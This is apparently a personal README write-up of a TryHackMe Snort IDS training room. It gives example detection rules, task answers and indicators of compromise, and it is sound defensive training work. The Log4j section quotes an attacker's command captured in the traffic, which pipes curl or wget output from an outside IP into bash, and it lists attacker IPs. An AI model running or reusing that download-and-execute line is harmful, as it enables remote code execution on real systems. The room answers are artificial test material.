# TryHackMe CTF - Snort Challenge: The Basics

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Status](https://img.shields.io/badge/Status-Completed-success)
![Tools](https://img.shields.io/badge/Tools-Snort%20%7C%20tshark-blue)

## 📋 Description

Put your Snort skills into practice and write Snort rules to analyse live capture network traffic. This room focuses on writing IDS rules for various protocols and troubleshooting rule syntax errors.

- **Room URL**: https://tryhackme.com/room/snortchallenges1
- **Category**: Network Security, IDS/IPS, Snort
- **Points**: 600
- **Difficulty**: Medium
- **Estimated Time**: 90 minutes

## 🎯 Objectives

Master Snort IDS rule writing by:
- ✅ Writing IDS rules for HTTP traffic
- ✅ Writing IDS rules for FTP traffic
- ✅ Writing IDS rules for PNG file detection
- ✅ Writing IDS rules for Torrent metafile detection
- ✅ Troubleshooting rule syntax errors
- ✅ Using external rules (MS17-010)
- ✅ Using external rules (Log4j CVE-2021-44228)

## 📊 Resolution Summary

### Tasks Completed

| Task | Description | Questions | Status |
|------|-------------|-----------|--------|
| Task 1 | Introduction | 0 | ✅ |
| Task 2 | Writing IDS Rules (HTTP) | 7 | ✅ |
| Task 3 | Writing IDS Rules (FTP) | 6 | ✅ |
| Task 4 | Writing IDS Rules (PNG) | 2 | ✅ |
| Task 5 | Writing IDS Rules (Torrent Metafile) | 4 | ✅ |
| Task 6 | Troubleshooting Rule Syntax Errors | 7 | ✅ |
| Task 7 | Using External Rules (MS17-010) | 4 | ✅ |
| Task 8 | Using External Rules (Log4j) | 8 | ✅ |
| Task 9 | Conclusion | 1 | ✅ |

**Total**: 40/40 questions ✅ (100%)

## 🔍 Key Findings

### Task 2: HTTP Traffic Analysis
- **Packets detected**: 164 TCP port 80
- **Destination IP**: 145.254.160.237
- **ACK number**: 0x38AFFFF3
- **TTL**: 128
- **Source IP**: 65.208.228.223
- **Source port**: 3372

### Task 3: FTP Traffic Analysis
- **Packets detected**: 307 TCP port 21
- **FTP Service**: Microsoft ftpd
- **Failed logins**: 41
- **Successful logins**: 1
- **Administrator attempts**: 7

### Task 4: PNG File Detection
- **Software**: Adobe ImageReady
- **GIF format**: GIF89a

### Task 5: Torrent Metafile Detection
- **Torrent packets**: 2
- **Application**: bittorrent
- **MIME type**: application/x-bittorrent
- **Hostname**: tracker2.torrentbox.com

### Task 6: Syntax Error Troubleshooting
- Fixed 7 different Snort rule files
- Detected between 2-155 packets per fixed rule
- Most common error: missing required "msg" option

### Task 7: MS17-010 Exploitation
- **Detected packets**: 25,154
- **IPC$ packets**: 12
- **Requested path**: \\192.168.116.138\IPC$
- **CVSS v2 score**: 9.3

### Task 8: Log4j Exploitation (CVE-2021-44228)
- **Detected packets**: 26
- **Rules triggered**: 4
- **Rule SIDs**: 210037*
- **Packets (770-855 bytes)**: 41
- **Encoding**: Base64
- **IP ID**: 62808
- **Attacker command**: `(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash`
- **CVSS v2 score**: 9.3

## 🛠️ Tools Used

- **Snort**: Network intrusion detection system
- **tshark**: Command-line network protocol analyzer
- **Wireshark**: PCAP analysis
- **Bash**: Script automation

## 📁 Repository Structure

```
tryhackme-ctf/snort-challenge-basics/
├── README.md                 # This file
└── SUMMARY.md                # Executive summary
```

## 🚀 Methodology

### Writing Snort Rules

Basic Snort rule syntax:
```
alert <protocol> <source IP> <source port> -> <destination IP> <destination port> (msg:"<message>"; sid:<id>; rev:<revision>;)
```

### Example Rules

**HTTP Traffic Detection:**
```
alert tcp any any -> any 80 (msg:"TCP port 80 outbound traffic"; sid:1000000000001; rev:1)
alert tcp any 80 -> any any (msg:"TCP port 80 inbound traffic"; sid:1000000000002; rev:1)
```

**FTP Login Detection:**
```
alert tcp any 21 -> any any (content:"530"; msg:"Failed FTP login"; sid:100002; rev:1)
alert tcp any 21 -> any any (content:"230"; msg:"Successful FTP login"; sid:100003; rev:1)
```

**File Type Detection:**
```
alert tcp any any -> any any (content:"PNG"; msg:"PNG file detected"; sid:100004; rev:1)
alert tcp any any -> any any (content:"torrent"; msg:"Torrent detected"; sid:100005; rev:1)
```

**MS17-010 IPC$ Detection:**
```
alert tcp any any -> any any (content:"\IPC$"; msg:"IPC$ path detected"; sid:100006; rev:1)
```

**Log4j Payload Size Detection:**
```
alert tcp any any -> any any (dsize:770<>855; msg:"Suspicious payload size"; sid:100007; rev:1)
```

## 📌 IOCs (Indicators of Compromise)

### MS17-010 Attack
```
IP: 192.168.116.138
Protocol: TCP
Service: SMB (IPC$)
CVSS: 9.3 (Critical)
```

### Log4j Attack (CVE-2021-44228)
```
Attack IPs: 45.155.205.233, 162.0.228.253
Protocol: TCP/HTTP
Encoding: Base64
Payload: Remote code execution via curl/wget
CVSS: 9.3 (Critical)
```

## 💡 Lessons Learned

1. **Bidirectional rules**: Always create rules for both inbound and outbound traffic
2. **Content matching**: Use specific patterns for accurate detection
3. **Syntax validation**: Always test rules with `-A console` mode first
4. **Rule options**: Required options like `msg` and `sid` must be present
5. **Size filters**: Use `dsize` for payload size-based detection
6. **Base64 detection**: Log4j often uses Base64 encoding for obfuscation

## 🔗 Resources

- [TryHackMe Room](https://tryhackme.com/room/snortchallenges1)
- [Snort Official Documentation](https://www.snort.org/documents)
- [Snort Rule Writing Guide](https://docs.snort.org/rules/)
- [MS17-010 Information](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [Log4j Vulnerability (CVE-2021-44228)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

## 🏆 Completion

✅ Room completed successfully
✅ All questions solved (40/40)
✅ 100% completion rate
✅ Complete documentation created

---

**Author**: Salim Hadda
**Date**: 2025-12-26
**Skills**: Snort IDS, Rule Writing, Network Security Monitoring
